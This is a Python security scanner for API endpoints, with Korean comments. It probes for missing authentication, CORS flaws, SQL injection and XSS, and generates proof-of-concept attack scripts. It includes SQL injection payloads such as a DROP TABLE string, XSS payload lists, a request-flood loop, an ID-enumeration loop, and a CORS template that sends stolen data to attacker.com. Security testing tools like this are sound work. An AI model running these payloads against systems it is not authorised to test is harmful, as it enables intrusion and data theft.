"""Security vulnerability scanner for API endpoints."""

import requests
import re
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, quote
from src.utils.models import APIEndpoint, Vulnerability, VulnerabilityLevel, HTTPMethod


class VulnerabilityScanner:
    """Scan API endpoints for security vulnerabilities."""

    def __init__(self, timeout: int = 10):
        """Initialize vulnerability scanner."""
        self.timeout = timeout
        self.vulnerabilities: List[Vulnerability] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Shadow-API-Scanner/1.0 (Security Testing)'
        })

    @staticmethod
    def is_shadow_api(endpoint: APIEndpoint) -> bool:
        """
        엔드포인트가 Shadow API(숨겨진/문서화되지 않은 API)인지 판별.

        Shadow API 판별 기준:
        - /internal/, /admin/, /debug/, /test/ 등 내부 경로 포함
        - /backup/, /config/, /secret/ 등 민감한 경로
        - /v0/, /beta/, /dev/ 등 개발/베타 버전
        - 비표준 HTTP 메소드
        - 문서화되지 않은 숨겨진 파라미터
        """
        url_lower = endpoint.url.lower()

        # Shadow API 패턴
        shadow_patterns = [
            r'/internal/',
            r'/admin/',
            r'/debug/',
            r'/test/',
            r'/backup/',
            r'/config/',
            r'/secret/',
            r'/hidden/',
            r'/private/',
            r'/dev/',
            r'/beta/',
            r'/v0/',
            r'/staging/',
            r'/temp/',
            r'/tmp/',
            r'/exec',
            r'/eval',
            r'/cmd',
            r'/_',  # 언더스코어로 시작하는 경로
        ]

        for pattern in shadow_patterns:
            if re.search(pattern, url_lower):
                return True

        # 문서화되지 않은 파라미터 (common names for hidden params)
        if endpoint.parameters:
            hidden_params = ['debug', 'test', 'internal', 'admin', 'dev', 'trace', 'verbose']
            for param in endpoint.parameters.keys():
                if param.lower() in hidden_params:
                    return True

        return False

    def scan_endpoint(self, endpoint: APIEndpoint) -> List[Vulnerability]:
        """Scan a single endpoint for vulnerabilities."""
        vulns = []

        # Authentication check
        vulns.extend(self._check_authentication(endpoint))

        # CORS check
        vulns.extend(self._check_cors(endpoint))

        # Sensitive data exposure
        vulns.extend(self._check_sensitive_data(endpoint))

        # Rate limiting
        vulns.extend(self._check_rate_limiting(endpoint))

        # SQL Injection (basic check)
        vulns.extend(self._check_sql_injection(endpoint))

        # XSS (basic check)
        vulns.extend(self._check_xss(endpoint))

        self.vulnerabilities.extend(vulns)
        return vulns

    def scan_endpoints(self, endpoints: List[APIEndpoint]) -> List[Vulnerability]:
        """Scan multiple endpoints."""
        all_vulns = []
        for endpoint in endpoints:
            try:
                vulns = self.scan_endpoint(endpoint)
                all_vulns.extend(vulns)
            except Exception as e:
                print(f"[!] Error scanning {endpoint.url}: {e}")

        return all_vulns

    def _check_authentication(self, endpoint: APIEndpoint) -> List[Vulnerability]:
        """Check for missing or weak authentication."""
        vulns = []

        try:
            # Try accessing without authentication
            response = self.session.request(
                endpoint.method,
                endpoint.url,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )

            # If successful without auth, it's a vulnerability
            if response.status_code == 200:
                vulns.append(Vulnerability(
                    type="Missing Authentication",
                    level=VulnerabilityLevel.HIGH,
                    endpoint=endpoint.url,
                    method=endpoint.method,
                    description="API endpoint is accessible without authentication",
                    evidence=f"HTTP {response.status_code} response without credentials",
                    recommendation="Implement authentication mechanism (OAuth2, JWT, API Keys)",
                    cwe_id="CWE-306"
                ))

            # Check for basic auth over HTTP
            if endpoint.url.startswith('http://'):
                if 'authorization' in [h.lower() for h in endpoint.headers.keys()]:
                    vulns.append(Vulnerability(
                        type="Insecure Authentication",
                        level=VulnerabilityLevel.HIGH,
                        endpoint=endpoint.url,
                        method=endpoint.method,
                        description="Authentication credentials transmitted over unencrypted HTTP",
                        evidence="Authorization header present with HTTP protocol",
                        recommendation="Use HTTPS for all authenticated endpoints",
                        cwe_id="CWE-319"
                    ))

        except requests.exceptions.RequestException:
            # Connection errors are not vulnerabilities
            pass

        return vulns

    def _check_cors(self, endpoint: APIEndpoint) -> List[Vulnerability]:
        """Check for CORS misconfigurations."""
        vulns = []

        try:
            # Send request with Origin header
            headers = {'Origin': 'https://evil.com'}
            response = self.session.request(
                endpoint.method,
                endpoint.url,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )

            # Check CORS headers
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')

            # Wildcard with credentials
            if acao == '*' and acac.lower() == 'true':
                vulns.append(Vulnerability(
                    type="CORS Misconfiguration",
                    level=VulnerabilityLevel.HIGH,
                    endpoint=endpoint.url,
                    method=endpoint.method,
                    description="CORS allows any origin with credentials",
                    evidence=f"Access-Control-Allow-Origin: * with Allow-Credentials: true",
                    recommendation="Specify allowed origins explicitly, avoid wildcard with credentials",
                    cwe_id="CWE-942"
                ))

            # Reflects arbitrary origin
            elif acao == 'https://evil.com':
                vulns.append(Vulnerability(
                    type="CORS Misconfiguration",
                    level=VulnerabilityLevel.MEDIUM,
                    endpoint=endpoint.url,
                    method=endpoint.method,
                    description="CORS reflects arbitrary origins",
                    evidence=f"Access-Control-Allow-Origin reflects requester's origin",
                    recommendation="Implement whitelist of allowed origins",
                    cwe_id="CWE-942"
                ))

        except requests.exceptions.RequestException:
            pass

        return vulns

    def _check_sensitive_data(self, endpoint: APIEndpoint) -> List[Vulnerability]:
        """Check for sensitive data exposure."""
        vulns = []

        # Check URL for sensitive patterns
        sensitive_patterns = [
            (r'password', 'Password in URL'),
            (r'api[_-]?key', 'API Key in URL'),
            (r'secret', 'Secret in URL'),
            (r'token', 'Token in URL'),
            (r'ssn|social[_-]security', 'SSN in URL'),
            (r'credit[_-]?card', 'Credit Card in URL'),
        ]

        url_lower = endpoint.url.lower()
        for pattern, desc in sensitive_patterns:
            if re.search(pattern, url_lower):
                vulns.append(Vulnerability(
                    type="Sensitive Data Exposure",
                    level=VulnerabilityLevel.MEDIUM,
                    endpoint=endpoint.url,
                    method=endpoint.method,
                    description=f"{desc} parameter detected",
                    evidence=f"URL contains sensitive pattern: {pattern}",
                    recommendation="Move sensitive data to request body or headers, use encryption",
                    cwe_id="CWE-200"
                ))

        # Check response for sensitive data
        if endpoint.response_example:
            response_lower = endpoint.response_example.lower()
            for pattern, desc in sensitive_patterns:
                if re.search(pattern, response_lower):
                    vulns.append(Vulnerability(
                        type="Sensitive Data Exposure",
                        level=VulnerabilityLevel.HIGH,
                        endpoint=endpoint.url,
                        method=endpoint.method,
                        description=f"{desc} in API response",
                        evidence=f"Response contains sensitive pattern: {pattern}",
                        recommendation="Mask or remove sensitive data from responses",
                        cwe_id="CWE-200"
                    ))

        return vulns

    def _check_rate_limiting(self, endpoint: APIEndpoint) -> List[Vulnerability]:
        """Check for rate limiting."""
        vulns = []

        try:
            # Send multiple rapid requests
            responses = []
            for i in range(5):
                response = self.session.request(
                    endpoint.method,
                    endpoint.url,
                    timeout=self.timeout,
                    verify=False
                )
                responses.append(response.status_code)

            # If all succeed, no rate limiting
            if all(code == 200 for code in responses):
                # Check for rate limit headers
                has_rate_limit_headers = any(
                    h in response.headers
                    for h in ['X-RateLimit-Limit', 'X-Rate-Limit', 'RateLimit-Limit']
                )

                if not has_rate_limit_headers:
                    vulns.append(Vulnerability(
                        type="Missing Rate Limiting",
                        level=VulnerabilityLevel.MEDIUM,
                        endpoint=endpoint.url,
                        method=endpoint.method,
                        description="No rate limiting detected",
                        evidence="Multiple rapid requests succeeded without rate limit headers",
                        recommendation="Implement rate limiting to prevent abuse and DoS",
                        cwe_id="CWE-770"
                    ))

        except requests.exceptions.RequestException:
            pass

        return vulns

    def _check_sql_injection(self, endpoint: APIEndpoint) -> List[Vulnerability]:
        """Basic SQL injection check."""
        vulns = []

        # Only check endpoints with parameters
        if not endpoint.parameters:
            return vulns

        sql_payloads = ["'", "1' OR '1'='1", "'; DROP TABLE users--"]

        try:
            for param_name in endpoint.parameters.keys():
                # Test with SQL payload
                test_url = endpoint.url
                if '?' in test_url:
                    test_url += f"&{param_name}={sql_payloads[0]}"
                else:
                    test_url += f"?{param_name}={sql_payloads[0]}"

                response = self.session.request(
                    endpoint.method,
                    test_url,
                    timeout=self.timeout,
                    verify=False
                )

                # Check for SQL error messages
                sql_errors = [
                    'sql syntax', 'mysql', 'postgresql', 'ora-', 'sqlite',
                    'syntax error', 'unclosed quotation'
                ]

                response_text = response.text.lower()
                if any(error in response_text for error in sql_errors):
                    vulns.append(Vulnerability(
                        type="Possible SQL Injection",
                        level=VulnerabilityLevel.CRITICAL,
                        endpoint=endpoint.url,
                        method=endpoint.method,
                        description=f"SQL error message detected in response",
                        evidence=f"Parameter '{param_name}' may be vulnerable to SQL injection",
                        recommendation="Use parameterized queries, input validation, and ORM",
                        cwe_id="CWE-89"
                    ))
                    break

        except requests.exceptions.RequestException:
            pass

        return vulns

    def _check_xss(self, endpoint: APIEndpoint) -> List[Vulnerability]:
        """Basic XSS check."""
        vulns = []

        # Only check endpoints with parameters
        if not endpoint.parameters:
            return vulns

        xss_payload = "<script>alert('XSS')</script>"

        try:
            for param_name in endpoint.parameters.keys():
                test_url = endpoint.url
                if '?' in test_url:
                    test_url += f"&{param_name}={xss_payload}"
                else:
                    test_url += f"?{param_name}={xss_payload}"

                response = self.session.request(
                    endpoint.method,
                    test_url,
                    timeout=self.timeout,
                    verify=False
                )

                # Check if payload is reflected unescaped
                if xss_payload in response.text:
                    vulns.append(Vulnerability(
                        type="Possible XSS",
                        level=VulnerabilityLevel.HIGH,
                        endpoint=endpoint.url,
                        method=endpoint.method,
                        description=f"User input reflected without sanitization",
                        evidence=f"Parameter '{param_name}' may be vulnerable to XSS",
                        recommendation="Implement input sanitization and output encoding",
                        cwe_id="CWE-79"
                    ))
                    break

        except requests.exceptions.RequestException:
            pass

        return vulns

    def get_vulnerabilities(self) -> List[Vulnerability]:
        """Get all discovered vulnerabilities."""
        return self.vulnerabilities

    def get_vulnerabilities_by_level(self, level: VulnerabilityLevel) -> List[Vulnerability]:
        """Get vulnerabilities filtered by severity level."""
        return [v for v in self.vulnerabilities if v.level == level]

    def get_statistics(self) -> Dict:
        """Get vulnerability statistics."""
        return {
            'total': len(self.vulnerabilities),
            'critical': len(self.get_vulnerabilities_by_level(VulnerabilityLevel.CRITICAL)),
            'high': len(self.get_vulnerabilities_by_level(VulnerabilityLevel.HIGH)),
            'medium': len(self.get_vulnerabilities_by_level(VulnerabilityLevel.MEDIUM)),
            'low': len(self.get_vulnerabilities_by_level(VulnerabilityLevel.LOW)),
        }

    def clear(self):
        """Clear vulnerabilities."""
        self.vulnerabilities.clear()

    @staticmethod
    def generate_poc(vuln: Vulnerability) -> Optional[str]:
        """
        취약점에 대한 PoC(Proof of Concept) 코드 생성.

        Args:
            vuln: 취약점 객체

        Returns:
            PoC 코드 문자열
        """
        poc_type = vuln.type.lower()
        endpoint = vuln.endpoint
        method = vuln.method

        if 'sql injection' in poc_type:
            return f"""# SQL Injection PoC
# Endpoint: {endpoint}
# Method: {method}

import requests

# 기본 SQL Injection 페이로드
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "1' UNION SELECT NULL, NULL, NULL--"
]

for payload in payloads:
    # GET 요청 예시
    url = f"{endpoint}?id={{payload}}"
    response = requests.get(url)

    # SQL 에러 메시지 확인
    sql_errors = ['sql syntax', 'mysql', 'postgresql', 'sqlite', 'ora-']
    if any(error in response.text.lower() for error in sql_errors):
        print(f"[+] SQL Injection 취약점 발견: {{payload}}")
        print(f"    응답: {{response.text[:200]}}")

# POST 요청 예시
# response = requests.post("{endpoint}", data={{"username": payload, "password": "test"}})
"""

        elif 'xss' in poc_type:
            return f"""# XSS PoC
# Endpoint: {endpoint}
# Method: {method}

import requests

# XSS 페이로드
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(\"XSS\")'>"
]

for payload in payloads:
    url = f"{endpoint}?search={{payload}}"
    response = requests.get(url)

    # 페이로드가 이스케이프 없이 반영되는지 확인
    if payload in response.text:
        print(f"[+] XSS 취약점 발견: {{payload}}")
        print(f"    페이로드가 응답에 그대로 반영됨")

# HTML을 파일로 저장하여 브라우저에서 확인
with open('xss_test.html', 'w', encoding='utf-8') as f:
    f.write(response.text)
print("[*] xss_test.html 파일을 브라우저에서 열어 확인하세요")
"""

        elif 'authentication' in poc_type:
            return f"""# Missing Authentication PoC
# Endpoint: {endpoint}
# Method: {method}

import requests

# 인증 없이 민감한 엔드포인트 접근 시도
response = requests.{method.lower()}("{endpoint}")

print(f"Status Code: {{response.status_code}}")
print(f"Response: {{response.text[:500]}}")

if response.status_code == 200:
    print("[+] 인증 없이 접근 가능한 취약점 확인!")
    print("[!] 민감한 데이터가 노출될 수 있습니다")

# 일반 사용자로 관리자 엔드포인트 접근 시도
headers = {{"Authorization": "Bearer user_token_here"}}
response = requests.{method.lower()}("{endpoint}", headers=headers)

if response.status_code == 200:
    print("[+] 권한 상승 취약점 발견!")
"""

        elif 'cors' in poc_type:
            return f"""# CORS Misconfiguration PoC
# Endpoint: {endpoint}
# Method: {method}

import requests

# 악의적인 Origin에서 요청
evil_origin = "https://evil.com"
headers = {{
    "Origin": evil_origin,
    "Access-Control-Request-Method": "{method}",
    "Access-Control-Request-Headers": "authorization"
}}

# Preflight 요청
response = requests.options("{endpoint}", headers=headers)
print(f"Preflight Response Headers:")
for header, value in response.headers.items():
    if 'access-control' in header.lower():
        print(f"  {{header}}: {{value}}")

# 실제 요청
response = requests.{method.lower()}("{endpoint}", headers={{"Origin": evil_origin}})
acao = response.headers.get('Access-Control-Allow-Origin', '')
acac = response.headers.get('Access-Control-Allow-Credentials', '')

if acao == evil_origin or acao == '*':
    print(f"[+] CORS 취약점 확인!")
    print(f"    ACAO: {{acao}}")
    print(f"    ACAC: {{acac}}")
    if acac.lower() == 'true':
        print(f"[!] 크리덴셜 포함 가능 - 높은 위험도!")

# 악의적인 HTML 페이지 예시
html_poc = '''<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<script>
fetch('{endpoint}', {{
    credentials: 'include',
    headers: {{'Origin': 'https://evil.com'}}
}})
.then(response => response.json())
.then(data => {{
    console.log('Stolen data:', data);
    // 공격자 서버로 데이터 전송
    fetch('https://attacker.com/collect', {{
        method: 'POST',
        body: JSON.stringify(data)
    }});
}});
</script>
</body>
</html>'''

with open('cors_poc.html', 'w') as f:
    f.write(html_poc)
print("[*] cors_poc.html 생성 완료")
"""

        elif 'rate limit' in poc_type:
            return f"""# Missing Rate Limiting PoC
# Endpoint: {endpoint}
# Method: {method}

import requests
import time

# 대량 요청 전송
print("[*] Rate Limiting 테스트 시작...")
success_count = 0
fail_count = 0

for i in range(100):
    response = requests.{method.lower()}("{endpoint}")

    if response.status_code == 200:
        success_count += 1
    elif response.status_code == 429:  # Too Many Requests
        fail_count += 1
        print(f"[*] Rate Limit 적용됨 ({{i+1}}번째 요청)")
        break

    if i % 10 == 0:
        print(f"[*] {{i+1}}/100 요청 완료...")

print(f"\\n[결과]")
print(f"  성공: {{success_count}}")
print(f"  차단: {{fail_count}}")

if success_count == 100:
    print(f"[+] Rate Limiting 미적용 취약점 확인!")
    print(f"[!] 브루트포스, DDoS 공격에 취약합니다")
"""

        elif 'sensitive data' in poc_type:
            return f"""# Sensitive Data Exposure PoC
# Endpoint: {endpoint}
# Method: {method}

import requests
import re

response = requests.{method.lower()}("{endpoint}")

# 민감한 데이터 패턴 검색
sensitive_patterns = {{
    'password': r'password.*?[\\w{{}}]+',
    'api_key': r'api[_-]?key.*?[\\w{{}}]+',
    'secret': r'secret.*?[\\w{{}}]+',
    'token': r'token.*?[\\w{{}}]+',
    'ssn': r'\\d{{3}}-\\d{{2}}-\\d{{4}}',
    'credit_card': r'\\d{{4}}-\\d{{4}}-\\d{{4}}-\\d{{4}}'
}}

print(f"[*] 민감한 데이터 검색 중...")
for data_type, pattern in sensitive_patterns.items():
    matches = re.findall(pattern, response.text, re.IGNORECASE)
    if matches:
        print(f"[+] {{data_type}} 발견:")
        for match in matches[:5]:  # 처음 5개만 출력
            print(f"    {{match}}")

# 응답 헤더 확인
print(f"\\n[*] 응답 헤더:")
for header, value in response.headers.items():
    if any(sensitive in header.lower() for sensitive in ['key', 'token', 'secret', 'auth']):
        print(f"  {{header}}: {{value}}")
"""

        elif 'idor' in poc_type or 'insecure direct object' in poc_type:
            return f"""# IDOR (Insecure Direct Object Reference) PoC
# Endpoint: {endpoint}
# Method: {method}

import requests

# 사용자 A의 토큰으로 로그인
user_a_token = "user_a_jwt_token_here"
headers_a = {{"Authorization": f"Bearer {{user_a_token}}"}}

# 사용자 A의 정보 조회
response = requests.{method.lower()}("{endpoint}/1", headers=headers_a)
print(f"사용자 A의 정보: {{response.json()}}")

# 사용자 B의 ID로 접근 시도 (권한 없음)
for user_id in range(1, 11):
    response = requests.{method.lower()}(f"{endpoint}/{{user_id}}", headers=headers_a)

    if response.status_code == 200:
        print(f"[+] IDOR 취약점 발견! 사용자 ID {{user_id}}의 정보 접근 가능")
        print(f"    응답: {{response.json()}}")
"""

        else:
            # 기본 PoC 템플릿
            return f"""# {vuln.type} PoC
# Endpoint: {endpoint}
# Method: {method}
# CWE: {vuln.cwe_id}

import requests

# 취약점 테스트
response = requests.{method.lower()}("{endpoint}")

print(f"Status Code: {{response.status_code}}")
print(f"Response Headers: {{response.headers}}")
print(f"Response Body: {{response.text[:500]}}")

# 상세 설명:
# {vuln.description}

# 권장사항:
# {vuln.recommendation}
"""
